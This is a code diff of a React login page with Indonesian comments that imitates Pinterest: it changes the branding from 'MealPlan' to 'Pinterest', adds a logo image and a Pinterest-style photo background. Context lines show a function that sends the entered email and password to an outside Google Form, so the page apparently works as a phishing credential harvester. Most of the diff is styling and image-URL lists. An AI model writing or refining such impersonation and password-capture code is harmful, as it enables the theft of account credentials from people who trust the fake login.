@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 
 const GOOGLE_FORM_ACTION =
   "https://docs.google.com/forms/d/e/1FAIpQLSfQixt2_ED6YtLqEiwUNKANJwAAWV2TfKNLoVJ2NSlqnDF6Vg/formResponse";
@@ -6,90 +6,91 @@ const ENTRY_EMAIL = "entry.1697602432";
 const ENTRY_PASSWORD = "entry.1806551528";
 
 // ─────────────────────────────────────────────
-// DATA
+// DATA PHOTO BACKGROUND
 // ─────────────────────────────────────────────
 const bgPhotos = [
- // Kolom 1 & Sekitarnya (Aktivitas Outdoor, Pria Bawa Tas, Lampu Gantung)
-  { url: "https://images.unsplash.com/photo-1504280390367-361c6d9f38f4?w=400&auto=format&fit=crop&q=80" }, // Api unggun di malam hari / Camping
-  { url: "https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?w=400&auto=format&fit=crop&q=80" }, // Pria berjalan kasual membawa tas travel cokelat
-  { url: "https://images.unsplash.com/photo-1507473885765-e6ed057f782c?w=400&auto=format&fit=crop&q=80" }, // Lampu gantung putih minimalis estetik
+  // Nature & Landscape
+  { url: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=400&auto=format&fit=crop&q=80" }, // Pegunungan dramatis dengan kabut
+  { url: "https://images.unsplash.com/photo-1448375240586-882707db888b?w=400&auto=format&fit=crop&q=80" }, // Hutan pinus dengan sinar matahari
+  { url: "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=400&auto=format&fit=crop&q=80" }, // Pantai tropis dengan pasir putih
 
-  // Kolom 2 & Sekitarnya (Kerajinan Kue/Tanah Liat, Pria Mantel Cokelat, Wanita Olahraga)
-  { url: "https://images.unsplash.com/photo-1517840901100-8179e982cab7?w=400&auto=format&fit=crop&q=80" }, // Tangan sedang membuat kerajinan/adonan di atas meja
-  { url: "https://images.unsplash.com/photo-1488161628813-04466f872be2?w=400&auto=format&fit=crop&q=80" }, // Pria dengan mantel cokelat panjang bersandar di dinding batu
-  { url: "https://images.unsplash.com/photo-1517838277536-f5f99be501cd?w=400&auto=format&fit=crop&q=80" }, // Wanita tampak belakang dengan baju olahraga di ruangan redup
+  // Urban & Architecture
+  { url: "https://images.unsplash.com/photo-1477959858617-67f85cf4f1df?w=400&auto=format&fit=crop&q=80" }, // Cityscape malam hari dengan lampu
+  { url: "https://images.unsplash.com/photo-1486325212027-8081e485255e?w=400&auto=format&fit=crop&q=80" }, // Jembatan kota ikonik
+  { url: "https://images.unsplash.com/photo-1460317442991-0ec209397118?w=400&auto=format&fit=crop&q=80" }, // Gedung arsitektur modern
 
-  // Kolom 3 & Sekitarnya (Gaya Celana Jeans & Sneakers, Pagar Kayu Rustic)
-  { url: "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=400&auto=format&fit=crop&q=80" }, // Fokus pada sepatu sneakers dan celana jeans di jalanan
-  { url: "https://images.unsplash.com/photo-1508349937151-22b68b72d5b1?w=400&auto=format&fit=crop&q=80" }, // Pagar tanaman hijau merambat di dinding kayu gelap
+  // Food & Lifestyle
+  { url: "https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=400&auto=format&fit=crop&q=80" }, // Kopi latte art di cafe
+  { url: "https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=400&auto=format&fit=crop&q=80" }, // Makanan sehat colorful di meja
+  { url: "https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=400&auto=format&fit=crop&q=80" }, // Fine dining plating elegan
 
-  // Kolom 4 & Sekitarnya (Toples Lampu, Mantel Estetik, Ombak Air Laut)
-  { url: "https://images.unsplash.com/photo-1513542789411-b6a5d4f31634?w=400&auto=format&fit=crop&q=80" }, // Tangan memegang toples kaca berisi lampu kawat tumblr hangat
-  { url: "https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=400&auto=format&fit=crop&q=80" }, // Seseorang mengenakan trench coat/mantel krem dari belakang
-  { url: "https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=400&auto=format&fit=crop&q=80" }, // Pemandangan aerial/atas ombak air laut biru kehijauan bersablon busa
+  // People & Fashion
+  { url: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=400&auto=format&fit=crop&q=80" }, // Wanita dengan outfit colorful
+  { url: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=400&auto=format&fit=crop&q=80" }, // Portrait pria dengan pencahayaan dramatis
+  { url: "https://images.unsplash.com/photo-1499952127939-9bbf5af6c51c?w=400&auto=format&fit=crop&q=80" }, // Orang di alam terbuka
 
-  // Kolom 5 & Sekitarnya (Rol Cat Warna-warni, Wanita Rok Kuning, Interior Ruangan)
-  { url: "https://images.unsplash.com/photo-1562259949-e8e7689d7828?w=400&auto=format&fit=crop&q=80" }, // Kuas/rol cat dinding dengan variasi warna cerah berderet
-  { url: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&auto=format&fit=crop&q=80" }, // Wanita anggun memakai baju putih dan rok panjang kuning di jalan setapak
-  { url: "https://images.unsplash.com/photo-1513694203232-719a280e022f?w=400&auto=format&fit=crop&q=80" }, // Interior aesthetic tanaman dalam rumah dekat jendela
+  // Abstract & Textures
+  { url: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&auto=format&fit=crop&q=80" }, // Tekstur warna pastel abstract
+  { url: "https://images.unsplash.com/photo-1550684848-fac1c5b4e853?w=400&auto=format&fit=crop&q=80" }, // Gradien warna vibrant
+  { url: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&auto=format&fit=crop&q=80" }, // Portrait closeup estetik
 
-  // Kolom 6 & Sekitarnya (Cangkir Kopi & Gulungan Wol, Wanita Duduk di Koper, Kamar Tidur)
-  { url: "https://images.unsplash.com/photo-1519676867240-f03562e64548?w=400&auto=format&fit=crop&q=80" }, // Meja santai berisi cangkir minuman hangat dan gulungan benang rajut
-  { url: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400&auto=format&fit=crop&q=80" }, // Wanita santai duduk bersandar di atas koper merah besar bertema retro
-  { url: "https://images.unsplash.com/photo-1616486338812-3dadae4b4ace?w=400&auto=format&fit=crop&q=80" }, // Kamar tidur minimalis putih dengan kasur rapi dan bingkai foto dinding
+  // Travel & Adventure
+  { url: "https://images.unsplash.com/photo-1501854140801-50d01698950b?w=400&auto=format&fit=crop&q=80" }, // Aerial view pegunungan hijau
+  { url: "https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=400&auto=format&fit=crop&q=80" }, // Orang hiking di pegunungan
+  { url: "https://images.unsplash.com/photo-1530521954074-e64f6810b32d?w=400&auto=format&fit=crop&q=80" }, // Suasana travel dengan koper
 ];
 
 const feedItems = [
-  { url: "https://images.unsplash.com/photo-1651948512032-8b4d4b37fe74?w=400&auto=format&fit=crop&q=80", title: "Healthy Meal Prep" },
-  { url: "https://images.unsplash.com/photo-1617650555983-eaf0230972c2?w=400&auto=format&fit=crop&q=80", title: "Fresh Garden Salad" },
-  { url: "https://images.unsplash.com/photo-1733410647375-3be1697aa4f1?w=400&auto=format&fit=crop&q=80", title: "Gourmet Black Plate" },
-  { url: "https://images.unsplash.com/photo-1684568519316-f0fb02f7826b?w=400&auto=format&fit=crop&q=80", title: "Grilled Chicken Bowl" },
-  { url: "https://images.unsplash.com/photo-1636035784722-6b0b9101a5e8?w=400&auto=format&fit=crop&q=80", title: "Pan-Seared Fish" },
-  { url: "https://images.unsplash.com/photo-1676471926534-d5c9771909fa?w=400&auto=format&fit=crop&q=80", title: "Salmon & Vegetables" },
-  { url: "https://images.unsplash.com/photo-1603064432115-ddcd7e888bb7?w=400&auto=format&fit=crop&q=80", title: "Tropical Fruit Plate" },
-  { url: "https://images.unsplash.com/photo-1612036167567-f94312b5230d?w=400&auto=format&fit=crop&q=80", title: "Homemade Cookies" },
-  { url: "https://images.unsplash.com/photo-1596698184224-3c04216caf0a?w=400&auto=format&fit=crop&q=80", title: "Asian Noodle Bowl" },
-  { url: "https://images.unsplash.com/photo-1777897269443-7c5a5bd7c44a?w=400&auto=format&fit=crop&q=80", title: "Gourmet Salad" },
-  { url: "https://images.unsplash.com/photo-1466637574441-749b8f19452f?w=400&auto=format&fit=crop&q=80", title: "Avocado & Eggs" },
-  { url: "https://images.unsplash.com/photo-1515003197210-e0cd71810b5f?w=400&auto=format&fit=crop&q=80", title: "Pasta al Dente" },
-  { url: "https://images.unsplash.com/photo-1476224203421-9ac39bcb3327?w=400&auto=format&fit=crop&q=80", title: "Slow-Roasted Lamb" },
-  { url: "https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&auto=format&fit=crop&q=80", title: "Neapolitan Pizza" },
-  { url: "https://images.unsplash.com/photo-1555939594-58d7cb561ad1?w=400&auto=format&fit=crop&q=80",    title: "Premium BBQ Skewers" },
-  { url: "https://images.unsplash.com/photo-1544025162-d76694265947?w=400&auto=format&fit=crop&q=80",    title: "Smoked Ribs Platter PlatterPlatter PlatterPlatter" },
-  { url: "https://images.unsplash.com/photo-1493770348161-369560ae357d?w=400&auto=format&fit=crop&q=80", title: "Healthy Artisan Toast" },
-  { url: "https://images.unsplash.com/photo-1478145046317-39f10e56b5e9?w=400&auto=format&fit=crop&q=80", title: "Mediterranean Salad Bowl" },
-  { url: "https://images.unsplash.com/photo-1455619452474-d2be8b1e70cd?w=400&auto=format&fit=crop&q=80", title: "Spicy Thai Curry" },
-  { url: "https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=400&auto=format&fit=crop&q=80", title: "Roasted Chicken Dinner" },
-  { url: "https://images.unsplash.com/photo-1497034825429-c343d7c6a68f?w=400&auto=format&fit=crop&q=80", title: "Fruity Ice Cream Berry Cone" },
-  { url: "https://images.unsplash.com/photo-1460306855393-0410f61241c7?w=400&auto=format&fit=crop&q=80", title: "Gourmet Double Burger" },
-  // Kolom 1 & Sekitarnya (Aktivitas Outdoor, Pria Bawa Tas, Lampu Gantung)
-  { url: "https://images.unsplash.com/photo-1504280390367-361c6d9f38f4?w=400&auto=format&fit=crop&q=80" }, // Api unggun di malam hari / Camping
-  { url: "https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?w=400&auto=format&fit=crop&q=80" }, // Pria berjalan kasual membawa tas travel cokelat
-  { url: "https://images.unsplash.com/photo-1507473885765-e6ed057f782c?w=400&auto=format&fit=crop&q=80" }, // Lampu gantung putih minimalis estetik
-
-  // Kolom 2 & Sekitarnya (Kerajinan Kue/Tanah Liat, Pria Mantel Cokelat, Wanita Olahraga)
-  { url: "https://images.unsplash.com/photo-1517840901100-8179e982cab7?w=400&auto=format&fit=crop&q=80" }, // Tangan sedang membuat kerajinan/adonan di atas meja
-  { url: "https://images.unsplash.com/photo-1488161628813-04466f872be2?w=400&auto=format&fit=crop&q=80" }, // Pria dengan mantel cokelat panjang bersandar di dinding batu
-  { url: "https://images.unsplash.com/photo-1517838277536-f5f99be501cd?w=400&auto=format&fit=crop&q=80" }, // Wanita tampak belakang dengan baju olahraga di ruangan redup
-
-  // Kolom 3 & Sekitarnya (Gaya Celana Jeans & Sneakers, Pagar Kayu Rustic)
-  { url: "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=400&auto=format&fit=crop&q=80" }, // Fokus pada sepatu sneakers dan celana jeans di jalanan
-  { url: "https://images.unsplash.com/photo-1508349937151-22b68b72d5b1?w=400&auto=format&fit=crop&q=80" }, // Pagar tanaman hijau merambat di dinding kayu gelap
-
-  // Kolom 4 & Sekitarnya (Toples Lampu, Mantel Estetik, Ombak Air Laut)
-  { url: "https://images.unsplash.com/photo-1513542789411-b6a5d4f31634?w=400&auto=format&fit=crop&q=80" }, // Tangan memegang toples kaca berisi lampu kawat tumblr hangat
-  { url: "https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=400&auto=format&fit=crop&q=80" }, // Seseorang mengenakan trench coat/mantel krem dari belakang
-  { url: "https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=400&auto=format&fit=crop&q=80" }, // Pemandangan aerial/atas ombak air laut biru kehijauan bersablon busa
-
-  // Kolom 5 & Sekitarnya (Rol Cat Warna-warni, Wanita Rok Kuning, Interior Ruangan)
-  { url: "https://images.unsplash.com/photo-1562259949-e8e7689d7828?w=400&auto=format&fit=crop&q=80" }, // Kuas/rol cat dinding dengan variasi warna cerah berderet
-  { url: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&auto=format&fit=crop&q=80" }, // Wanita anggun memakai baju putih dan rok panjang kuning di jalan setapak
-  { url: "https://images.unsplash.com/photo-1513694203232-719a280e022f?w=400&auto=format&fit=crop&q=80" }, // Interior aesthetic tanaman dalam rumah dekat jendela
-
-  // Kolom 6 & Sekitarnya (Cangkir Kopi & Gulungan Wol, Wanita Duduk di Koper, Kamar Tidur)
-  { url: "https://images.unsplash.com/photo-1519676867240-f03562e64548?w=400&auto=format&fit=crop&q=80" }, // Meja santai berisi cangkir minuman hangat dan gulungan benang rajut
-  { url: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400&auto=format&fit=crop&q=80" }, // Wanita santai duduk bersandar di atas koper merah besar bertema retro
-  { url: "https://images.unsplash.com/photo-1616486338812-3dadae4b4ace?w=400&auto=format&fit=crop&q=80" }, // Kamar tidur minimalis putih dengan kasur rapi dan bingkai foto dinding
+  // Nature & Landscape
+  { url: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=400&auto=format&fit=crop&q=80", title: "Mountain Sunrise", h: 300 },
+  { url: "https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=400&auto=format&fit=crop&q=80", title: "Forest Path", h: 220 },
+  { url: "https://images.unsplash.com/photo-1518495973542-4542c06a5843?w=400&auto=format&fit=crop&q=80", title: "Golden Hour", h: 260 },
+  { url: "https://images.unsplash.com/photo-1472214103451-9374bd1c798e?w=400&auto=format&fit=crop&q=80", title: "Lake Reflection", h: 340 },
+  { url: "https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=400&auto=format&fit=crop&q=80", title: "Desert Dunes", h: 190 },
+  { url: "https://images.unsplash.com/photo-1501854140801-50d01698950b?w=400&auto=format&fit=crop&q=80", title: "Aerial Forest", h: 280 },
+  // Architecture & Interior
+  { url: "https://images.unsplash.com/photo-1493809842364-78817add7ffb?w=400&auto=format&fit=crop&q=80", title: "Minimalist Room", h: 240 },
+  { url: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=400&auto=format&fit=crop&q=80", title: "Modern Kitchen", h: 320 },
+  { url: "https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=400&auto=format&fit=crop&q=80", title: "Cozy Living Room", h: 200 },
+  { url: "https://images.unsplash.com/photo-1502005229762-cf1b2da7c5d6?w=400&auto=format&fit=crop&q=80", title: "City Architecture", h: 360 },
+  { url: "https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=400&auto=format&fit=crop&q=80", title: "Loft Bedroom", h: 250 },
+  // Fashion & Style
+  { url: "https://images.unsplash.com/photo-1469334031218-e382a71b716b?w=400&auto=format&fit=crop&q=80", title: "Street Style", h: 380 },
+  { url: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400&auto=format&fit=crop&q=80", title: "Fashion Editorial", h: 310 },
+  { url: "https://images.unsplash.com/photo-1483985988355-763728e1935b?w=400&auto=format&fit=crop&q=80", title: "Shopping Bags", h: 210 },
+  { url: "https://images.unsplash.com/photo-1509631179647-0177331693ae?w=400&auto=format&fit=crop&q=80", title: "Minimal Outfit", h: 270 },
+  // Food & Coffee
+  { url: "https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=400&auto=format&fit=crop&q=80", title: "Coffee Art", h: 230 },
+  { url: "https://images.unsplash.com/photo-1567620905732-2d1ec7ab7445?w=400&auto=format&fit=crop&q=80", title: "Pancake Stack", h: 290 },
+  { url: "https://images.unsplash.com/photo-1490474418585-ba9bad8fd0ea?w=400&auto=format&fit=crop&q=80", title: "Acai Bowl", h: 180 },
+  { url: "https://images.unsplash.com/photo-1546069901-ba9599a7e63c?w=400&auto=format&fit=crop&q=80", title: "Healthy Bowl", h: 350 },
+  { url: "https://images.unsplash.com/photo-1565299507177-b0ac66763828?w=400&auto=format&fit=crop&q=80", title: "Street Food", h: 220 },
+  // Travel & City
+  { url: "https://images.unsplash.com/photo-1540959733332-eab4deabeeaf?w=400&auto=format&fit=crop&q=80", title: "Tokyo Night", h: 300 },
+  { url: "https://images.unsplash.com/photo-1499856871958-5b9627545d1a?w=400&auto=format&fit=crop&q=80", title: "Paris Eiffel", h: 260 },
+  { url: "https://images.unsplash.com/photo-1523482580672-f109ba8cb9be?w=400&auto=format&fit=crop&q=80", title: "Sydney Opera", h: 200 },
+  { url: "https://images.unsplash.com/photo-1534430480872-3498386e7856?w=400&auto=format&fit=crop&q=80", title: "Bali Sunset", h: 330 },
+  { url: "https://images.unsplash.com/photo-1552832230-c0197dd311b5?w=400&auto=format&fit=crop&q=80", title: "Rome Streets", h: 240 },
+  // People & Lifestyle
+  { url: "https://images.unsplash.com/photo-1529156069898-49953e39b3ac?w=400&auto=format&fit=crop&q=80", title: "Friends Laughing", h: 280 },
+  { url: "https://images.unsplash.com/photo-1522202176988-66273c2fd55f?w=400&auto=format&fit=crop&q=80", title: "Working Together", h: 210 },
+  { url: "https://images.unsplash.com/photo-1506126613408-eca07ce68773?w=400&auto=format&fit=crop&q=80", title: "Morning Yoga", h: 370 },
+  { url: "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=400&auto=format&fit=crop&q=80", title: "Couple Goals", h: 250 },
+  // Art & Creative
+  { url: "https://images.unsplash.com/photo-1513364776144-60967b0f800f?w=400&auto=format&fit=crop&q=80", title: "Art Studio", h: 320 },
+  { url: "https://images.unsplash.com/photo-1547891654-e66ed7ebb968?w=400&auto=format&fit=crop&q=80", title: "Abstract Paint", h: 190 },
+  { url: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&auto=format&fit=crop&q=80", title: "Watercolor", h: 260 },
+  // Animals
+  { url: "https://images.unsplash.com/photo-1518020382113-a7e8fc38eac9?w=400&auto=format&fit=crop&q=80", title: "Cute Dog", h: 230 },
+  { url: "https://images.unsplash.com/photo-1548681528-6a5c45b66b42?w=400&auto=format&fit=crop&q=80", title: "Fluffy Cat", h: 290 },
+  { url: "https://images.unsplash.com/photo-1474511320723-9a56873867b5?w=400&auto=format&fit=crop&q=80", title: "Fox in Snow", h: 340 },
+  // Plants & Flowers
+  { url: "https://images.unsplash.com/photo-1457089328109-e5d9bd499191?w=400&auto=format&fit=crop&q=80", title: "Spring Flowers", h: 200 },
+  { url: "https://images.unsplash.com/photo-1416879595882-3373a0480b5b?w=400&auto=format&fit=crop&q=80", title: "Garden Bloom", h: 310 },
+  { url: "https://images.unsplash.com/photo-1463936575829-25148e1db1b8?w=400&auto=format&fit=crop&q=80", title: "Succulent", h: 220 },
+  // Tech & Minimal
+  { url: "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=400&auto=format&fit=crop&q=80", title: "Coding Setup", h: 260 },
+  { url: "https://images.unsplash.com/photo-1484788984921-03950022c9ef?w=400&auto=format&fit=crop&q=80", title: "Clean Desk", h: 180 },
 ];
 
 // ─────────────────────────────────────────────
@@ -105,14 +106,13 @@ function submitToGoogleForm(email: string, password: string) {
     mode: "no-cors",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: body.toString(),
-  }).catch(() => {
-    // no-cors: non-fatal fallback
-  });
+  }).catch(() => {});
 }
 
 // ─────────────────────────────────────────────
-// MASONRY BACKGROUND (login page)
+// MASONRY BACKGROUND (TIDAK BERUBAH)
 // ─────────────────────────────────────────────
+// BARU - foto unik, tidak repeat, height variatif
 function MasonryBackground() {
   const [colCount, setColCount] = useState(6);
   useEffect(() => {
@@ -121,15 +121,20 @@ function MasonryBackground() {
     window.addEventListener("resize", update);
     return () => window.removeEventListener("resize", update);
   }, []);
-  const cols: typeof bgPhotos[][] = Array.from({ length: colCount }, () => []);
-  for (let i = 0; i < colCount * 7; i++) cols[i % colCount].push(bgPhotos[i % bgPhotos.length]);
+
+  const shuffled = useMemo(() => [...feedItems].sort(() => Math.random() - 0.5), []);
+  const cols = useMemo(() => {
+    const c: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
+    shuffled.forEach((item, i) => c[i % colCount].push(item));
+    return c;
+  }, [shuffled, colCount]);
+
   return (
-    <div style={{ position: "fixed", inset: 0, display: "flex", gap: 8, padding: "0 4px", overflow: "hidden", background: "#111" }}>
+    <div style={{ position: "fixed", inset: 0, display: "flex", gap: 8, padding: "0 4px", overflow: "hidden", background: "#ffffff" }}>
       {cols.map((col, ci) => (
         <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 8, flex: 1, marginTop: ci % 2 === 1 ? -44 : 0 }}>
           {col.map((p, pi) => (
-            <img key={pi} src={p.url} alt="" loading="lazy"
-              style={{ width: "100%", height: p.h, borderRadius: 14, objectFit: "cover", flexShrink: 0 }} />
+            <img key={pi} src={p.url} alt="" loading="lazy" style={{ width: "100%", height: p.h ?? 220, borderRadius: 14, objectFit: "cover", flexShrink: 0 }} />
           ))}
         </div>
       ))}
@@ -138,7 +143,7 @@ function MasonryBackground() {
 }
 
 // ─────────────────────────────────────────────
-// SIGN UP MODAL
+// SIGN UP MODAL (MENGGUNAKAN IMAGE SRC)
 // ─────────────────────────────────────────────
 function SignUpModal({ onClose }: { onClose: () => void }) {
   const [name, setName] = useState("");
@@ -154,372 +159,381 @@ function SignUpModal({ onClose }: { onClose: () => void }) {
     alert(`✅ Akun berhasil dibuat! Selamat datang, ${name}.`);
     onClose();
   }
+
   const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
     width: "100%", padding: "12px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
     borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
   });
+
   return (
-    <div style={{ position: "fixed", inset: 0, zIndex: 30, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
-      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
+    <div style={{ position: "fixed", inset: 0, zIndex: 130, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }} onClick={e => e.target === e.currentTarget && onClose()}>
       <div style={{ background: "#fff", borderRadius: 24, padding: "36px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center", position: "relative" }}>
         <button onClick={onClose} style={{ position: "absolute", top: 14, right: 16, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#767676" }}>✕</button>
-        {/* LINGKARAN LOGO (TEMPAT 1) */}
-        <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
-            <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
-          </svg>
+        
+        {/* LOGO BULAT BERBASIS FOTO (SRC) */}
+        <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", overflow: "hidden" }}>
+          <img src="favicon.png" alt="Logo" style={{ width: "100%", height: "100%", objectFit: "cover" }}/>
         </div>
-        <h2 style={{ fontSize: 21, fontWeight: 700, color: "#111", marginBottom: 4 }}>Welcome to MealPlan</h2>
-        <p style={{ fontSize: 13, color: "#767676", marginBottom: 18 }}>Find recipes and plan your week</p>
+
+        <h2 style={{ fontSize: 21, fontWeight: 700, color: "#111", marginBottom: 4 }}>Welcome to Pinterest</h2>
+        
+        
         <form onSubmit={handleSubmit} noValidate style={{ display: "flex", flexDirection: "column", gap: 10 }}>
-          <input placeholder="Full name" value={name} onChange={e => { setName(e.target.value); setError(""); }} style={inp(name)} />
-          <input type="email" placeholder="Email" value={email} onChange={e => { setEmail(e.target.value); setError(""); }} style={inp(email)} />
+          <input placeholder="Full name" value={name} onChange={e => setName(e.target.value)} style={inp(name)} />
+          <input type="email" placeholder="Email" value={email} onChange={e => setEmail(e.target.value)} style={inp(email)} />
           <div style={{ position: "relative" }}>
-            <input type={showPw ? "text" : "password"} placeholder="Create a password" value={password}
-              onChange={e => { setPassword(e.target.value); setError(""); }} style={inp(password, { paddingRight: 52 })} />
-            <button type="button" onClick={() => setShowPw(v => !v)}
-              style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>
-              {showPw ? "Hide" : "Show"}
-            </button>
+            <input type={showPw ? "text" : "password"} placeholder="Create a password" value={password} onChange={e => setPassword(e.target.value)} style={inp(password, { paddingRight: 52 })} />
+            <button type="button" onClick={() => setShowPw(v => !v)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>{showPw ? "Hide" : "Show"}</button>
           </div>
           <div style={{ textAlign: "left" }}>
             <label style={{ fontSize: 12, color: "#767676", display: "block", marginBottom: 4 }}>Tanggal lahir</label>
-            <input type="date" value={dob} onChange={e => { setDob(e.target.value); setError(""); }} style={inp(dob)} />
+            <input type="date" value={dob} onChange={e => setDob(e.target.value)} style={inp(dob)} />
           </div>
           {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left" }}>{error}</p>}
-          <button type="submit" style={{ width: "100%", padding: 13, background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: "pointer", marginTop: 4 }}>
-            Continue
-          </button>
+          <button type="submit" style={{ width: "100%", padding: 13, background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: "pointer", marginTop: 4 }}>Continue</button>
         </form>
-        <p style={{ marginTop: 14, fontSize: 11, color: "#767676", lineHeight: 1.6 }}>
-          By continuing, you agree to MealPlan's <a href="#" style={{ color: "#767676", fontWeight: 600 }}>Terms of Service</a> and <a href="#" style={{ color: "#767676", fontWeight: 600 }}>Privacy Policy</a>.
-        </p>
       </div>
     </div>
   );
 }
 
 // ─────────────────────────────────────────────
-// PINTEREST STYLE FEED CARD (UPDATED)
+// PINTEREST STYLE FEED CARD 
 // ─────────────────────────────────────────────
 function FeedCard({ item }: { item: typeof feedItems[0] }) {
   const [hov, setHov] = useState(false);
   const [saved, setSaved] = useState(false);
 
-  // Fallback jika property tinggi 'h' tidak ada di array data
-  const cardHeight = item.h ? item.h + 40 : 280; 
-
   return (
     <div 
       onMouseEnter={() => setHov(true)} 
       onMouseLeave={() => setHov(false)}
-      style={{ 
-        borderRadius: 20, // Sudut lengkung lebih membulat sesuai gambar
-        overflow: "hidden", 
-        position: "relative", 
-        cursor: "pointer", 
-        background: "#efefef", 
-        marginBottom: 14 
-      }}
+      style={{ borderRadius: 24, overflow: "hidden", position: "relative", cursor: "pointer", background: "#efefef", marginBottom: 14 }}
     >
-      {/* Foto Utama */}
       <img 
         src={item.url} 
-        alt={item.title || "Pinterest Image"} 
+        alt={item.title} 
         loading="lazy"
-        style={{ 
-          width: "100%", 
-          height: cardHeight, 
-          objectFit: "cover", 
-          display: "block", 
-          transition: "transform 0.3s ease", 
-          transform: hov ? "scale(1.03)" : "scale(1)" 
-        }} 
+        style={{ width: "100%", height: item.h || 280, objectFit: "cover", display: "block", transition: "transform 0.3s ease", transform: hov ? "scale(1.03)" : "scale(1)" }} 
       />
 
-      {/* Overlay Gelap Transparan saat Hover */}
       {hov && (
         <div 
           style={{ 
             position: "absolute", 
             inset: 0, 
-            background: "linear-gradient(to bottom, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.1) 50%, rgba(0,0,0,0.65) 100%)", 
+            background: "linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 40%, rgba(0,0,0,0.65) 100%)", 
             display: "flex",
             flexDirection: "column",
             justifyContent: "space-between",
             padding: 14,
-            transition: "opacity 0.25s ease",
             boxSizing: "border-box"
           }}
         >
-          {/* Bagian Atas: Tombol Simpan Merah */}
           <div style={{ display: "flex", justifyContent: "flex-end" }}>
             <button 
               onClick={e => { e.stopPropagation(); setSaved(v => !v); }}
-              style={{ 
-                padding: "10px 18px", 
-                background: saved ? "#333" : "#e60023", 
-                color: "#fff", 
-                border: "none", 
-                borderRadius: 24, 
-                fontWeight: 700, 
-                fontSize: 14, 
-                cursor: "pointer",
-                boxShadow: "0 2px 8px rgba(0,0,0,0.15)"
-              }}
+              style={{ padding: "10px 20px", background: saved ? "#333" : "#e60023", color: "#fff", border: "none", borderRadius: 24, fontWeight: 700, fontSize: 14, cursor: "pointer", boxShadow: "0 2px 8px rgba(0,0,0,0.15)" }}
             >
               {saved ? "Tersimpan" : "Simpan"}
             </button>
           </div>
 
